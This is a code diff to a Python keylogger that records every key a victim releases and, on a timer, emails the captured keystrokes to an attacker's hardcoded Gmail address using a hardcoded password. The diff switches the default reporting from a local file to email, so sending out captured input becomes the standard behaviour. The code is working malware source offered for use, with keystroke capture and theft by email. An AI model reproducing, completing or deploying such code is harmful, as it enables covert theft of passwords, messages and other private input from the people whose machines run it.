@@ -4,7 +4,7 @@ import keyboard
 import smtplib
 from threading import Timer
 from datetime import datetime
-SEND_REPORT_EVERY = 60
+INTERVAL = 60
 EMAIL_ADDRESS= "fsattacker247@gmail.com"
 EMAIL_PASSWORD ="FS123456789"
 
@@ -17,14 +17,14 @@ class Keylogger:
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
     def callback (self, event):
-        name =event.name
+        name = event.name
         if len(name)>1:
             if name== "space":
-                name = " "
+                name = "[SPACE]"
             elif name == "enter":
                 name ="[Enter]\n"
-            elif name == "decimal":
-                name = "."
+            elif name == "tab":
+                name = "[TAB]"
             else:
                 name = name.replace(" ", "_")
                 name = f"[{name.upper()}]"
@@ -40,7 +40,7 @@ class Keylogger:
     def report_to_file(self):
         with open(f"{self.filename}.txt", "w") as f:
             print(self.log, file=f)
-        print(f"[+] Saved {self.filename}.txt")
+        print(f"{self.filename}.txt")
 
     # Send Emails
     def sendmail(self, email, password, message):
@@ -49,24 +49,29 @@ class Keylogger:
         server.login(email, password)
         server.sendmail(email, email, message)
         server.quit
+
+
     def report(self):
         if self.log:
             self.end_dt = datetime.now()
             self.update_filename()
             if self.report_method == "email":
                 self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
-            elif self.report_method == "file":
-                self.report_to_file()
+            # elif self.report_method == "file":
+            #     self.report_to_file()
             self.start_dt = datetime.now()
         self.log = ""
         timer= Timer(interval = self.interval, function=self.report)
         timer.daemon = True
         timer.start()
+
     def start(self):
         self.start_dt = datetime.now()
         keyboard.on_release(callback=self.callback)
         self.report()
         keyboard.wait()
+
+
 if __name__ == "__main__":
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+    keylogger = Keylogger(interval=INTERVAL, report_method="email")
     keylogger.start()
